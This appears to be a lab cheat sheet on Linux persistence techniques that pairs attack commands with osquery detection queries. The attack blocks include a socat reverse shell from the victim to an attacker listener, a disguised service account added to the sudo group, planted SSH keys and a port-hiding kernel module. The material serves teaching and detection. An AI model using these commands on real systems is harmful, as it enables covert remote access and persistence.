# Profile Files [~/.bashrc; ~/.profile]

## Attack
```c
# Attacker
socat -d -d OPENSSL-LISTEN:1337,cert=cert.pem,verify=0,fork STDOUT

# Victim
socat OPENSSL:<IP_ADDRESS>:1337,verify=0 EXEC:/bin/bash&
```

## Detection
```c
# Victim

## Simple
netstat -a | grep 1337

## Osquery
SELECT * FROM process_open_sockets WHERE remote_port=1337;
```


# Creating User Account

## Attack
```c
# Victim

## Service Account with Bash shell
sudo useradd -r -s /usr/bin/bash -G 27 ec2-aws-sync
```

## Detection
```c
# Victim

## Simple
cat /etc/passwd
cat auth.log | grep ec2-aws

## Osquery 1 [Get all users with uid < 1000]
SELECT * FROM users WHERE uid < 1000;

## Osquery 2 [Get users with login shells]
SELECT uid, username, directory, shell FROM users WHERE shell != "/usr/sbin/nologin";

```

# SSH Authorized Keys

## Attack
```c
# Attacker

## Generate SSH keypair on C2 and copy id_rsa.pub to Victim machine's ~/.ssh/authorized_keys
ssh-keygen

## SSH into Victim
ssh ubuntu@<IP_ADDRESS>
```

## Detection
```c
# Victim

## Osquery
SELECT authorized_keys.* FROM users JOIN authorized_keys USING(uid);
```

# Cron Jobs

## Attack
```c
# Attacker
socat -d -d OPENSSL-LISTEN:1337,cert=cert.pem,verify=0,fork STDOUT

# Victim
Run crontab -e and uncomment cronjob
```

## Detection
```c
# Victim

## Simple
crontab -l

## Osquery [Doesn't work properly in our demo scenario]
SELECT * FROM crontab;
```

# Systemd Unit Files

## Attack
```c
# Attacker
socat -d -d TCP4-LISTEN:1337 STDOUT

# Victim
sudo systemctl start revshell.service
```

## Detection
```c
# Victim

## osquery
SELECT id, description, fragment_path, md5 FROM systemd_units JOIN hash ON (hash.path = systemd_units.fragment_path) WHERE id LIKE "%service";
```

# Kernel Modules

## Attack
```C
# Victim

## Compile & insert the Kernel Module
cd /home/ubuntu/Documents/kernelmodules/hidingports
make
sudo insmod shellcode.ko

## Check port in Osquery
SELECT * FROM process_open_sockets WHERE remote_port=1337;

## Remove Kernel Module & re-check port 
sudo rmmod shellcode
SELECT * FROM process_open_sockets WHERE remote_port=1337;
```

# Shared Libraries 
```c
# Victim

## Show shared libraries
ldd /bin/cat
ldd /bin/bash
```

